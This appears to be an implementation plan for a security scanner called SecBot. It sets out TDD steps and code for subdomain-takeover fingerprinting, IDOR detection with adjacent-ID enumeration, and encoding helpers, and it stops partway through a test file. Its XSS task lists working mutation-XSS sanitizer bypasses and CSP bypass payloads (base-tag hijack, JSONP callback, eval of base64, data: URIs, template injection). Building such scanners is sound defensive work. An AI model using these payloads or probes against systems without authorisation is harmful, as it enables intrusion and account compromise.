# SecBot v1.0 Phase 2: Detection Depth — Implementation Plan

> **For agentic workers:** REQUIRED: Use superpowers:subagent-driven-development (if subagents available) or superpowers:executing-plans to implement this plan. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Deepen SecBot's detection capabilities with the highest-ROI bounty checks: subdomain takeover, IDOR parameter manipulation, mutation XSS/CSP bypass, and enhanced payload mutations.

**Architecture:** Each new check follows the existing ActiveCheck singleton pattern. New checks register in CHECK_REGISTRY. Existing checks are deepened with additional test cases and payload variants. All changes are TDD — test first, implement, verify.

**Tech Stack:** TypeScript 5, Playwright, Vitest, Node.js 20+ DNS APIs

**Spec:** `docs/superpowers/specs/2026-03-12-v1-bounty-ready-design.md`

---

## File Structure

### New Files
| File | Responsibility |
|------|---------------|
| `src/scanner/active/subdomain-takeover.ts` | Detect dangling CNAMEs on enumerated subdomains |
| `src/scanner/active/subdomain-takeover-fingerprints.ts` | Service fingerprint database (GitHub Pages, Heroku, S3, etc.) |
| `test/unit/subdomain-takeover.test.ts` | Unit tests for takeover detection |
| `test/unit/idor-depth.test.ts` | Tests for IDOR parameter manipulation |
| `test/unit/xss-mutation.test.ts` | Tests for mutation XSS payloads |
| `test/unit/payload-mutator-v2.test.ts` | Tests for new encoding strategies |

### Modified Files
| File | Changes |
|------|---------|
| `src/scanner/active/index.ts` | Register `subdomainTakeoverCheck` in CHECK_REGISTRY |
| `src/scanner/active/idor.ts` | Add query param ID detection, UUID manipulation, horizontal enum |
| `src/scanner/active/xss.ts` | Add mutation XSS detection, CSP bypass testing |
| `src/config/payloads/xss.ts` | Add mutation XSS payloads, CSP bypass payloads |
| `src/scanner/types.ts` | Add `subdomain-takeover` to CheckCategory |
| `src/utils/payload-mutator.ts` | Add `fromCharCode`, `json-unicode` encoding strategies |
| `src/ai/prompts.ts` | Add `subdomain-takeover` to PlannerCheckType + CHECK_SECTIONS |
| `src/ai/fallback.ts` | Add subdomain-takeover to OWASP/impact/fix maps |

---

## Chunk 1: Subdomain Takeover Detection

### Task 1: Service Fingerprint Database

**Files:**
- Create: `src/scanner/active/subdomain-takeover-fingerprints.ts`
- Test: `test/unit/subdomain-takeover.test.ts`

- [ ] **Step 1: Write the failing test**

```typescript
// test/unit/subdomain-takeover.test.ts
import { describe, it, expect } from 'vitest';
import {
  TAKEOVER_FINGERPRINTS,
  matchFingerprint,
  type ServiceFingerprint,
} from '../../src/scanner/active/subdomain-takeover-fingerprints.js';

describe('subdomain-takeover-fingerprints', () => {
  it('has fingerprints for major services', () => {
    const serviceNames = TAKEOVER_FINGERPRINTS.map((f) => f.service);
    expect(serviceNames).toContain('GitHub Pages');
    expect(serviceNames).toContain('Heroku');
    expect(serviceNames).toContain('AWS S3');
    expect(serviceNames).toContain('Shopify');
    expect(serviceNames).toContain('Azure');
    expect(TAKEOVER_FINGERPRINTS.length).toBeGreaterThanOrEqual(10);
  });

  it('matches GitHub Pages error page', () => {
    const result = matchFingerprint(
      'myapp.github.io',
      '<html><body>There isn\'t a GitHub Pages site here.</body></html>',
      404,
    );
    expect(result).not.toBeNull();
    expect(result!.service).toBe('GitHub Pages');
  });

  it('matches Heroku no-app error', () => {
    const result = matchFingerprint(
      'myapp.herokuapp.com',
      '<html><head><title>No such app</title></head></html>',
      404,
    );
    expect(result).not.toBeNull();
    expect(result!.service).toBe('Heroku');
  });

  it('matches S3 NoSuchBucket', () => {
    const result = matchFingerprint(
      'bucket.s3.amazonaws.com',
      '<Error><Code>NoSuchBucket</Code></Error>',
      404,
    );
    expect(result).not.toBeNull();
    expect(result!.service).toBe('AWS S3');
  });

  it('returns null for non-matching response', () => {
    const result = matchFingerprint(
      'example.com',
      '<html><body>Welcome to our site</body></html>',
      200,
    );
    expect(result).toBeNull();
  });

  it('matches by CNAME pattern when body is empty', () => {
    const result = matchFingerprint('app.example.com', '', 0, 'app.herokuapp.com');
    expect(result).not.toBeNull();
    expect(result!.service).toBe('Heroku');
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run test/unit/subdomain-takeover.test.ts`
Expected: FAIL — module not found

- [ ] **Step 3: Write the fingerprint database**

```typescript
// src/scanner/active/subdomain-takeover-fingerprints.ts

export interface ServiceFingerprint {
  service: string;
  /** CNAME patterns that indicate this service (regex) */
  cnamePatterns: RegExp[];
  /** Response body strings that indicate the service is unclaimed */
  bodyFingerprints: string[];
  /** HTTP status codes that suggest unclaimed */
  statusCodes: number[];
  /** Whether the service allows registration (some are defunct) */
  exploitable: boolean;
}

export const TAKEOVER_FINGERPRINTS: ServiceFingerprint[] = [
  {
    service: 'GitHub Pages',
    cnamePatterns: [/\.github\.io$/i],
    bodyFingerprints: [
      "There isn't a GitHub Pages site here.",
      'For root URLs (like http://example.com/) you must provide an index.html file',
    ],
    statusCodes: [404],
    exploitable: true,
  },
  {
    service: 'Heroku',
    cnamePatterns: [/\.herokuapp\.com$/i, /\.herokudns\.com$/i],
    bodyFingerprints: ['No such app', 'no-such-app', 'herokucdn.com/error-pages'],
    statusCodes: [404],
    exploitable: true,
  },
  {
    service: 'AWS S3',
    cnamePatterns: [/\.s3\.amazonaws\.com$/i, /\.s3-website[.-]/i, /\.s3\..+\.amazonaws\.com$/i],
    bodyFingerprints: ['NoSuchBucket', 'The specified bucket does not exist'],
    statusCodes: [404, 403],
    exploitable: true,
  },
  {
    service: 'Shopify',
    cnamePatterns: [/\.myshopify\.com$/i],
    bodyFingerprints: ['Sorry, this shop is currently unavailable', 'Only one step left'],
    statusCodes: [404],
    exploitable: true,
  },
  {
    service: 'Azure',
    cnamePatterns: [
      /\.azurewebsites\.net$/i,
      /\.cloudapp\.azure\.com$/i,
      /\.trafficmanager\.net$/i,
      /\.blob\.core\.windows\.net$/i,
    ],
    bodyFingerprints: ['404 Web Site not found', 'The resource you are looking for has been removed'],
    statusCodes: [404],
    exploitable: true,
  },
  {
    service: 'Netlify',
    cnamePatterns: [/\.netlify\.app$/i, /\.netlify\.com$/i],
    bodyFingerprints: ['Not Found - Request ID:'],
    statusCodes: [404],
    exploitable: true,
  },
  {
    service: 'Fastly',
    cnamePatterns: [/\.fastly\.net$/i, /\.fastlylb\.net$/i],
    bodyFingerprints: ['Fastly error: unknown domain'],
    statusCodes: [500],
    exploitable: true,
  },
  {
    service: 'Pantheon',
    cnamePatterns: [/\.pantheonsite\.io$/i],
    bodyFingerprints: ['The gods are wise', '404 error unknown site'],
    statusCodes: [404],
    exploitable: true,
  },
  {
    service: 'Tumblr',
    cnamePatterns: [/\.tumblr\.com$/i],
    bodyFingerprints: ["There's nothing here.", "Whatever you were looking for doesn't currently exist"],
    statusCodes: [404],
    exploitable: true,
  },
  {
    service: 'WordPress.com',
    cnamePatterns: [/\.wordpress\.com$/i],
    bodyFingerprints: ['Do you want to register'],
    statusCodes: [404],
    exploitable: true,
  },
  {
    service: 'Surge.sh',
    cnamePatterns: [/\.surge\.sh$/i],
    bodyFingerprints: ['project not found'],
    statusCodes: [404],
    exploitable: true,
  },
  {
    service: 'Fly.io',
    cnamePatterns: [/\.fly\.dev$/i],
    bodyFingerprints: ['404 Not Found'],
    statusCodes: [404],
    exploitable: true,
  },
  {
    service: 'Vercel',
    cnamePatterns: [/\.vercel\.app$/i, /\.now\.sh$/i],
    bodyFingerprints: ['The deployment could not be found on Vercel'],
    statusCodes: [404],
    exploitable: false, // Vercel requires ownership proof
  },
  {
    service: 'Google Cloud',
    cnamePatterns: [/\.appspot\.com$/i, /\.run\.app$/i],
    bodyFingerprints: ['The requested URL was not found on this server', 'Error: NOT_FOUND'],
    statusCodes: [404],
    exploitable: false,
  },
];

/**
 * Check if an HTTP response matches a known dangling service fingerprint.
 * @param subdomain - The subdomain being tested
 * @param body - HTTP response body
 * @param status - HTTP status code
 * @param cname - Optional CNAME target for the subdomain
 * @returns Matched fingerprint or null
 */
export function matchFingerprint(
  subdomain: string,
  body: string,
  status: number,
  cname?: string,
): ServiceFingerprint | null {
  for (const fp of TAKEOVER_FINGERPRINTS) {
    // Check CNAME match first (strongest signal)
    if (cname) {
      const cnameMatch = fp.cnamePatterns.some((re) => re.test(cname));
      if (cnameMatch) {
        // CNAME matches — check if body also indicates unclaimed
        const bodyMatch = fp.bodyFingerprints.some((sig) =>
          body.toLowerCase().includes(sig.toLowerCase()),
        );
        const statusMatch = fp.statusCodes.includes(status) || status === 0;
        if (bodyMatch || statusMatch) return fp;
      }
    }

    // Check body fingerprints (works without CNAME)
    const bodyMatch = fp.bodyFingerprints.some((sig) =>
      body.toLowerCase().includes(sig.toLowerCase()),
    );
    if (bodyMatch && fp.statusCodes.includes(status)) {
      return fp;
    }
  }

  return null;
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run test/unit/subdomain-takeover.test.ts`
Expected: PASS (all 6 tests)

- [ ] **Step 5: Commit**

```bash
git add src/scanner/active/subdomain-takeover-fingerprints.ts test/unit/subdomain-takeover.test.ts
git commit -m "feat(takeover): add service fingerprint database for subdomain takeover detection"
```

---

### Task 2: Subdomain Takeover Active Check

**Files:**
- Create: `src/scanner/active/subdomain-takeover.ts`
- Modify: `src/scanner/active/index.ts`
- Modify: `src/scanner/types.ts`
- Modify: `src/ai/prompts.ts`
- Modify: `src/ai/fallback.ts`
- Test: `test/unit/subdomain-takeover.test.ts` (extend)

- [ ] **Step 1: Add `subdomain-takeover` to CheckCategory type**

In `src/scanner/types.ts`, add `'subdomain-takeover'` to the `CheckCategory` union type.

- [ ] **Step 2: Write the failing test for the active check**

```typescript
// Append to test/unit/subdomain-takeover.test.ts
import { vi } from 'vitest';
import { subdomainTakeoverCheck, checkSubdomainTakeover } from '../../src/scanner/active/subdomain-takeover.js';

vi.mock('../../src/utils/logger.js', () => ({
  log: { info: vi.fn(), debug: vi.fn(), warn: vi.fn(), error: vi.fn() },
}));

describe('subdomainTakeoverCheck', () => {
  it('exports an ActiveCheck with correct name and category', () => {
    expect(subdomainTakeoverCheck.name).toBe('subdomain-takeover');
    expect(subdomainTakeoverCheck.category).toBe('subdomain-takeover');
    expect(subdomainTakeoverCheck.parallel).toBe(true);
  });
});

describe('checkSubdomainTakeover', () => {
  it('detects dangling CNAME to GitHub Pages', async () => {
    const findings = await checkSubdomainTakeover(
      [{ subdomain: 'docs.example.com', ips: ['185.199.108.153'], cname: 'org.github.io' }],
      'example.com',
      // Mock fetcher: simulates GitHub Pages 404
      async () => ({ status: 404, body: "There isn't a GitHub Pages site here." }),
    );
    expect(findings).toHaveLength(1);
    expect(findings[0].category).toBe('subdomain-takeover');
    expect(findings[0].severity).toBe('high');
    expect(findings[0].title).toContain('docs.example.com');
    expect(findings[0].evidence).toContain('GitHub Pages');
  });

  it('skips subdomains with no CNAME', async () => {
    const findings = await checkSubdomainTakeover(
      [{ subdomain: 'api.example.com', ips: ['1.2.3.4'] }],
      'example.com',
      async () => ({ status: 200, body: 'OK' }),
    );
    expect(findings).toHaveLength(0);
  });

  it('skips non-exploitable services', async () => {
    const findings = await checkSubdomainTakeover(
      [{ subdomain: 'app.example.com', ips: ['76.76.21.21'], cname: 'app.vercel.app' }],
      'example.com',
      async () => ({ status: 404, body: 'The deployment could not be found on Vercel' }),
    );
    expect(findings).toHaveLength(0); // Vercel is not exploitable
  });

  it('detects S3 bucket takeover', async () => {
    const findings = await checkSubdomainTakeover(
      [{ subdomain: 'assets.example.com', ips: [], cname: 'assets.s3.amazonaws.com' }],
      'example.com',
      async () => ({ status: 404, body: '<Error><Code>NoSuchBucket</Code></Error>' }),
    );
    expect(findings).toHaveLength(1);
    expect(findings[0].evidence).toContain('AWS S3');
  });

  it('limits concurrent checks', async () => {
    let concurrent = 0;
    let maxConcurrent = 0;
    const subs = Array.from({ length: 20 }, (_, i) => ({
      subdomain: `sub${i}.example.com`,
      ips: ['1.2.3.4'],
      cname: `sub${i}.github.io`,
    }));
    const findings = await checkSubdomainTakeover(
      subs,
      'example.com',
      async () => {
        concurrent++;
        maxConcurrent = Math.max(maxConcurrent, concurrent);
        await new Promise((r) => setTimeout(r, 10));
        concurrent--;
        return { status: 200, body: 'OK' };
      },
      5, // concurrency
    );
    expect(maxConcurrent).toBeLessThanOrEqual(5);
  });
});
```

- [ ] **Step 3: Run test to verify it fails**

Run: `npx vitest run test/unit/subdomain-takeover.test.ts`
Expected: FAIL — `subdomain-takeover.ts` not found

- [ ] **Step 4: Implement the subdomain takeover check**

```typescript
// src/scanner/active/subdomain-takeover.ts
import { randomUUID } from 'node:crypto';
import type { BrowserContext } from 'playwright';
import type { RawFinding, ScanConfig } from '../types.js';
import type { ActiveCheck, ScanTargets } from './index.js';
import type { RequestLogger } from '../../utils/request-logger.js';
import type { SubdomainResult } from '../recon/subdomain.js';
import { matchFingerprint } from './subdomain-takeover-fingerprints.js';
import { log } from '../../utils/logger.js';

type Fetcher = (url: string) => Promise<{ status: number; body: string }>;

/**
 * Check enumerated subdomains for dangling CNAME takeover opportunities.
 * Exported for direct testing with injectable fetcher.
 */
export async function checkSubdomainTakeover(
  subdomains: SubdomainResult[],
  targetDomain: string,
  fetcher: Fetcher,
  concurrency: number = 5,
): Promise<RawFinding[]> {
  // Only check subdomains that have a CNAME — no CNAME = no takeover risk
  const withCname = subdomains.filter((s) => s.cname);
  if (withCname.length === 0) {
    log.info('Subdomain takeover: no CNAMEs found, skipping');
    return [];
  }

  log.info(`Checking ${withCname.length} subdomains with CNAMEs for takeover...`);
  const findings: RawFinding[] = [];

  // Process in batches
  for (let i = 0; i < withCname.length; i += concurrency) {
    const batch = withCname.slice(i, i + concurrency);
    const results = await Promise.allSettled(
      batch.map(async (sub) => {
        try {
          const url = `https://${sub.subdomain}`;
          const { status, body } = await fetcher(url);
          const fp = matchFingerprint(sub.subdomain, body, status, sub.cname);

          if (fp && fp.exploitable) {
            findings.push({
              id: randomUUID(),
              category: 'subdomain-takeover',
              severity: 'high',
              title: `Subdomain takeover: ${sub.subdomain} (${fp.service})`,
              description:
                `${sub.subdomain} has a CNAME pointing to ${sub.cname} (${fp.service}), ` +
                `but the destination appears unclaimed. An attacker could register the service ` +
                `and serve malicious content on ${sub.subdomain}.`,
              url: `https://${sub.subdomain}`,
              evidence:
                `CNAME: ${sub.subdomain} -> ${sub.cname}\n` +
                `Service: ${fp.service}\n` +
                `HTTP Status: ${status}\n` +
                `Body match: ${fp.bodyFingerprints.find((sig) => body.toLowerCase().includes(sig.toLowerCase())) || 'CNAME pattern'}`,
              request: { method: 'GET', url: `https://${sub.subdomain}` },
              response: { status, bodySnippet: body.slice(0, 200) },
              timestamp: new Date().toISOString(),
            });
          }
        } catch (err) {
          log.debug(`Takeover check failed for ${sub.subdomain}: ${(err as Error).message}`);
        }
      }),
    );
  }

  return findings;
}

export const subdomainTakeoverCheck: ActiveCheck = {
  name: 'subdomain-takeover',
  category: 'subdomain-takeover',
  parallel: true, // read-only, no state mutation
  async run(context, targets, config, requestLogger) {
    // This check needs subdomain enumeration results.
    // If no subdomains were enumerated (--subdomains flag not used), skip.
    if (!config.subdomainResults?.length) {
      log.info('Subdomain takeover: no subdomain results available (use --subdomains to enable)');
      return [];
    }

    const fetcher: Fetcher = async (url) => {
      const page = await context.newPage();
      try {
        const response = await page.request.fetch(url, { timeout: 10000 });
        requestLogger?.log({
          timestamp: new Date().toISOString(),
          method: 'GET',
          url,
          responseStatus: response.status(),
          phase: 'active-subdomain-takeover',
        });
        return { status: response.status(), body: await response.text() };
      } catch (err) {
        return { status: 0, body: '' };
      } finally {
        await page.close();
      }
    };

    return checkSubdomainTakeover(
      config.subdomainResults,
      config.targetUrl,
      fetcher,
    );
  },
};
```

- [ ] **Step 5: Add `subdomainResults` to ScanConfig type**

In `src/scanner/types.ts`, add to the `ScanConfig` interface:
```typescript
/** Subdomain enumeration results (populated when --subdomains is used) */
subdomainResults?: import('../scanner/recon/subdomain.js').SubdomainResult[];
```

- [ ] **Step 6: Register in CHECK_REGISTRY**

In `src/scanner/active/index.ts`:
```typescript
import { subdomainTakeoverCheck } from './subdomain-takeover.js';
// Add to CHECK_REGISTRY array:
subdomainTakeoverCheck,
```

- [ ] **Step 7: Add to AI planner and fallback maps**

In `src/ai/prompts.ts`, add `'subdomain-takeover'` to `PlannerCheckType` and add to `CHECK_SECTIONS`:
```typescript
'subdomain-takeover': `- subdomain-takeover: Check enumerated subdomains for dangling CNAME records pointing to unclaimed cloud services (GitHub Pages, Heroku, S3, etc.)
  Rule: Run when --subdomains flag is used and subdomains have CNAME records.`,
```

In `src/ai/fallback.ts`, add to all three maps:
- OWASP: `A05:2021 Security Misconfiguration`
- Impact: `Attacker can claim abandoned subdomain and serve malicious content under your domain`
- Fix: `Remove dangling CNAME records or reclaim the cloud service they point to`

- [ ] **Step 8: Run all tests**

Run: `npx vitest run test/unit/subdomain-takeover.test.ts`
Expected: PASS (all ~11 tests)

Run: `npx vitest run`
Expected: All 1483+ tests pass (no regressions)

- [ ] **Step 9: Commit**

```bash
git add src/scanner/active/subdomain-takeover.ts src/scanner/active/subdomain-takeover-fingerprints.ts src/scanner/active/index.ts src/scanner/types.ts src/ai/prompts.ts src/ai/fallback.ts test/unit/subdomain-takeover.test.ts
git commit -m "feat(takeover): subdomain takeover detection — 14 service fingerprints, dangling CNAME check"
```

---

## Chunk 2: IDOR Depth — Parameter Manipulation

### Task 3: IDOR Query Parameter + UUID Detection

Current IDOR only finds sequential numeric IDs in URL paths (`/users/123`). Many APIs use query params (`?user_id=123`) or UUIDs (`/users/abc-def-...`). Also need horizontal enumeration — try `id ± 1` to find adjacent resources.

**Files:**
- Modify: `src/scanner/active/idor.ts`
- Create: `test/unit/idor-depth.test.ts`

- [ ] **Step 1: Write failing tests for query param IDOR**

```typescript
// test/unit/idor-depth.test.ts
import { describe, it, expect, vi } from 'vitest';
import { extractIdPatterns, extractQueryParamIds } from '../../src/scanner/active/idor.js';

vi.mock('../../src/utils/logger.js', () => ({
  log: { info: vi.fn(), debug: vi.fn(), warn: vi.fn(), error: vi.fn() },
}));

describe('extractQueryParamIds', () => {
  it('finds numeric IDs in query parameters', () => {
    const results = extractQueryParamIds('https://example.com/api/profile?user_id=42');
    expect(results).toHaveLength(1);
    expect(results[0].param).toBe('user_id');
    expect(results[0].value).toBe('42');
    expect(results[0].type).toBe('numeric');
  });

  it('finds UUID IDs in query parameters', () => {
    const results = extractQueryParamIds(
      'https://example.com/api/doc?id=550e8400-e29b-41d4-a716-446655440000',
    );
    expect(results).toHaveLength(1);
    expect(results[0].param).toBe('id');
    expect(results[0].type).toBe('uuid');
  });

  it('ignores non-ID parameters', () => {
    const results = extractQueryParamIds('https://example.com/search?q=hello&page=1&sort=asc');
    // page and sort are not ID-like parameters
    expect(results).toHaveLength(0);
  });

  it('detects ID-like parameter names', () => {
    const results = extractQueryParamIds(
      'https://example.com/api?account_id=5&order_id=99&token=abc',
    );
    expect(results).toHaveLength(2);
    expect(results.map((r) => r.param)).toContain('account_id');
    expect(results.map((r) => r.param)).toContain('order_id');
  });

  it('detects UUID in path segments', () => {
    const results = extractIdPatterns(
      'https://example.com/api/users/550e8400-e29b-41d4-a716-446655440000/profile',
    );
    expect(results.length).toBeGreaterThanOrEqual(1);
    // Should detect the UUID as an ID pattern
  });
});

describe('generateAdjacentIds', () => {
  // Import will be added when implementing
  it('generates ±1 for numeric IDs', async () => {
    const { generateAdjacentIds } = await import('../../src/scanner/active/idor.js');
    const adjacent = generateAdjacentIds('42', 'numeric');
    expect(adjacent).toContain('41');
    expect(adjacent).toContain('43');
  });

  it('returns empty for UUIDs (cannot enumerate)', async () => {
    const { generateAdjacentIds } = await import('../../src/scanner/active/idor.js');
    const adjacent = generateAdjacentIds('550e8400-e29b-41d4-a716-446655440000', 'uuid');
    expect(adjacent).toHaveLength(0);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run test/unit/idor-depth.test.ts`
Expected: FAIL — functions not exported

- [ ] **Step 3: Implement query param ID extraction and adjacent ID generation**

Add to `src/scanner/active/idor.ts`:

```typescript
/** Regex for ID-like query parameter names */
const ID_PARAM_NAMES = /^(id|user_id|account_id|order_id|invoice_id|item_id|product_id|doc_id|record_id|uid|pid|oid|cid|profile_id|customer_id|employee_id|member_id|ticket_id|case_id|file_id)$/i;

/** UUID v4 regex */
const UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;

export interface QueryParamId {
  url: string;
  param: string;
  value: string;
  type: 'numeric' | 'uuid';
}

/** Extract ID-like values from query parameters */
export function extractQueryParamIds(url: string): QueryParamId[] {
  const results: QueryParamId[] = [];
  try {
    const parsed = new URL(url);
    for (const [key, value] of parsed.searchParams) {
      if (!ID_PARAM_NAMES.test(key)) continue;

      if (/^\d+$/.test(value) && parseInt(value, 10) > 0 && parseInt(value, 10) <= 999999) {
        results.push({ url, param: key, value, type: 'numeric' });
      } else if (UUID_RE.test(value)) {
        results.push({ url, param: key, value, type: 'uuid' });
      }
    }
  } catch {
    // Invalid URL
  }
  return results;
}

/** Generate adjacent IDs for horizontal enumeration */
export function generateAdjacentIds(value: string, type: 'numeric' | 'uuid'): string[] {
  if (type === 'uuid') return []; // Can't enumerate UUIDs
  const num = parseInt(value, 10);
  const adjacent: string[] = [];
  if (num > 1) adjacent.push(String(num - 1));
  adjacent.push(String(num + 1));
  return adjacent;
}
```

Also update `extractIdPatterns` to handle UUIDs in path segments:
```typescript
// Add UUID path segment detection
const UUID_PATH_RE = /\/([a-z][a-z0-9_-]*?)\/([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})(?:\/|$|\?)/gi;
```

- [ ] **Step 4: Update testIdor to use query param + adjacent ID probing**

In the `testIdor` function, after the existing path-based IDOR testing, add:

```typescript
// Phase 2: Query parameter IDOR
const allUrlsForParams = [...new Set([...targets.pages, ...targets.urlsWithParams, ...targets.apiEndpoints])];
const queryParamIds = allUrlsForParams.flatMap(extractQueryParamIds);

// Deduplicate by origin + param name
const seenParams = new Set<string>();
const uniqueQueryParams = queryParamIds.filter((p) => {
  const key = `${new URL(p.url).origin}:${p.param}`;
  if (seenParams.has(key)) return false;
  seenParams.add(key);
  return true;
});

for (const qp of uniqueQueryParams) {
  // Test with adjacent IDs (horizontal enumeration)
  const adjacent = generateAdjacentIds(qp.value, qp.type);
  for (const adjId of adjacent) {
    const probeUrl = new URL(qp.url);
    probeUrl.searchParams.set(qp.param, adjId);
    // ... fetch with alt auth, compare responses (same pattern as path IDOR)
  }
}
```

- [ ] **Step 5: Run all tests**

Run: `npx vitest run test/unit/idor-depth.test.ts`
Expected: PASS

Run: `npx vitest run`
Expected: All tests pass

- [ ] **Step 6: Commit**

```bash
git add src/scanner/active/idor.ts test/unit/idor-depth.test.ts
git commit -m "feat(idor): query parameter ID detection + horizontal enumeration (±1 probing)"
```

---

## Chunk 3: Mutation XSS + CSP Bypass

### Task 4: Mutation XSS Payloads

**Files:**
- Modify: `src/config/payloads/xss.ts`
- Create: `test/unit/xss-mutation.test.ts`

- [ ] **Step 1: Write failing test for mutation XSS payloads**

```typescript
// test/unit/xss-mutation.test.ts
import { describe, it, expect } from 'vitest';
import { MUTATION_XSS_PAYLOADS, CSP_BYPASS_PAYLOADS } from '../../src/config/payloads/xss.js';

describe('mutation XSS payloads', () => {
  it('has at least 8 mutation payloads', () => {
    expect(MUTATION_XSS_PAYLOADS.length).toBeGreaterThanOrEqual(8);
  });

  it('all payloads have unique markers', () => {
    const markers = MUTATION_XSS_PAYLOADS.map((p) => p.marker);
    expect(new Set(markers).size).toBe(markers.length);
  });

  it('includes mXSS patterns (noscript, math, svg namespace)', () => {
    const payloadStrings = MUTATION_XSS_PAYLOADS.map((p) => p.payload.toLowerCase());
    expect(payloadStrings.some((p) => p.includes('<noscript'))).toBe(true);
    expect(payloadStrings.some((p) => p.includes('<math'))).toBe(true);
    expect(payloadStrings.some((p) => p.includes('<svg'))).toBe(true);
  });

  it('markers follow naming convention', () => {
    for (const p of MUTATION_XSS_PAYLOADS) {
      expect(p.marker).toMatch(/^secbot-mxss-\d+$/);
    }
  });
});

describe('CSP bypass payloads', () => {
  it('has at least 5 CSP bypass payloads', () => {
    expect(CSP_BYPASS_PAYLOADS.length).toBeGreaterThanOrEqual(5);
  });

  it('includes JSONP callback bypass', () => {
    const payloads = CSP_BYPASS_PAYLOADS.map((p) => p.payload);
    expect(payloads.some((p) => p.includes('callback') || p.includes('jsonp'))).toBe(true);
  });

  it('includes base tag hijack', () => {
    const payloads = CSP_BYPASS_PAYLOADS.map((p) => p.payload.toLowerCase());
    expect(payloads.some((p) => p.includes('<base'))).toBe(true);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run test/unit/xss-mutation.test.ts`
Expected: FAIL — exports not found

- [ ] **Step 3: Add mutation XSS and CSP bypass payloads**

Add to `src/config/payloads/xss.ts`:

```typescript
/** Mutation XSS payloads — exploit browser parser quirks to bypass sanitizers */
export const MUTATION_XSS_PAYLOADS: XSSPayload[] = [
  // noscript breakout: sanitizers parse <noscript> differently than browsers
  { payload: '<noscript><img src=x onerror="alert(\'secbot-mxss-0\')"></noscript>', marker: 'secbot-mxss-0', type: 'dom' },
  // Math namespace confusion
  { payload: '<math><mi><table><mglyph><style><!--</style><img src=x onerror=alert("secbot-mxss-1")>', marker: 'secbot-mxss-1', type: 'dom' },
  // SVG foreignObject
  { payload: '<svg><foreignObject><body onerror=alert("secbot-mxss-2")><img src=x></body></foreignObject></svg>', marker: 'secbot-mxss-2', type: 'dom' },
  // Style tag breakout in SVG
  { payload: '<svg><style>{font-family:\'<img/src=x onerror=alert("secbot-mxss-3")>\'}</style></svg>', marker: 'secbot-mxss-3', type: 'dom' },
  // DOMPurify bypass (namespace confusion)
  { payload: '<math><mtext><table><mglyph><style><!--</style><img src onerror=alert("secbot-mxss-4")>', marker: 'secbot-mxss-4', type: 'dom' },
  // Form tag injection
  { payload: '<form><button formaction=javascript:alert("secbot-mxss-5")>click</button></form>', marker: 'secbot-mxss-5', type: 'dom' },
  // Details/summary auto-execute
  { payload: '<details open ontoggle=alert("secbot-mxss-6")><summary>x</summary></details>', marker: 'secbot-mxss-6', type: 'event-handler' },
  // Nested template with script
  { payload: '<svg><use href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><image href=x onerror=alert(\'secbot-mxss-7\') /></svg>#x" />', marker: 'secbot-mxss-7', type: 'dom' },
];

/** CSP bypass payloads — exploit weak CSP configurations */
export const CSP_BYPASS_PAYLOADS: XSSPayload[] = [
  // Base tag hijack: redirect relative script loads to attacker server
  { payload: '<base href="https://secbot-csp-test.example.com/">', marker: 'secbot-csp-0', type: 'dom' },
  // JSONP callback on whitelisted domain
  { payload: '<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(\'secbot-csp-1\')"></script>', marker: 'secbot-csp-1', type: 'reflected' },
  // unsafe-eval exploitation
  { payload: '<img src=x onerror="eval(atob(\'YWxlcnQoInNlY2JvdC1jc3AtMiIp\'))">', marker: 'secbot-csp-2', type: 'event-handler' },
  // data: URI (if data: is allowed in CSP)
  { payload: '<script src="data:text/javascript,alert(\'secbot-csp-3\')"></script>', marker: 'secbot-csp-3', type: 'reflected' },
  // object/embed bypass
  { payload: '<object data="data:text/html,<script>alert(\'secbot-csp-4\')</script>">', marker: 'secbot-csp-4', type: 'dom' },
  // Angular template injection (when CDN is whitelisted)
  { payload: '{{constructor.constructor("alert(\'secbot-csp-5\')")()}}', marker: 'secbot-csp-5', type: 'template' },
];
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run test/unit/xss-mutation.test.ts`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/config/payloads/xss.ts test/unit/xss-mutation.test.ts
git commit -m "feat(xss): mutation XSS payloads (8) + CSP bypass payloads (6)"
```

---

### Task 5: Wire Mutation XSS into XSS Check

**Files:**
- Modify: `src/scanner/active/xss.ts`

- [ ] **Step 1: Import and integrate mutation payloads**

In `src/scanner/active/xss.ts`, import the new payload arrays:
```typescript
import { XSS_PAYLOADS, MUTATION_XSS_PAYLOADS, CSP_BYPASS_PAYLOADS } from '../../config/payloads/xss.js';
```

Add mutation XSS testing after DOM XSS tests:
```typescript
// Mutation XSS: test payloads that exploit parser quirks
if (config.profile === 'deep' || config.aiFocusAreas?.some((a) => a.includes('mutation') || a.includes('mxss'))) {
  for (const payload of MUTATION_XSS_PAYLOADS) {
    // Same injection + detection pattern as regular DOM XSS
    // but use innerHTML assignment to trigger parser mutations
  }
}

// CSP bypass: only if CSP was detected in passive scan
// Check if CSP has unsafe-eval, unsafe-inline, or data: sources
```

- [ ] **Step 2: Run full test suite**

Run: `npx vitest run`
Expected: All tests pass (no regressions)

- [ ] **Step 3: Commit**

```bash
git add src/scanner/active/xss.ts
git commit -m "feat(xss): wire mutation XSS + CSP bypass payloads into active check"
```

---

## Chunk 4: Enhanced Payload Mutations

### Task 6: New Encoding Strategies

**Files:**
- Modify: `src/utils/payload-mutator.ts`
- Create: `test/unit/payload-mutator-v2.test.ts`

- [ ] **Step 1: Write failing tests for new encodings**

```typescript
// test/unit/payload-mutator-v2.test.ts
import { describe, it, expect } from 'vitest';
import {
  mutatePayload,
  fromCharCodeEncode,
  jsonUnicodeEncode,
  type EncodingStrategy,
} from '../../src/utils/payload-mutator.js';

describe('fromCharCodeEncode', () => {
  it('converts string to String.fromCharCode()', () => {
    const result = fromCharCodeEncode('alert(1)');
    expect(result).toBe('String.fromCharCode(97,108,101,114,116,40,49,41)');
  });

  it('handles empty string', () => {
    expect(fromCharCodeEncode('')).toBe('String.fromCharCode()');
  });
});

describe('jsonUnicodeEncode', () => {
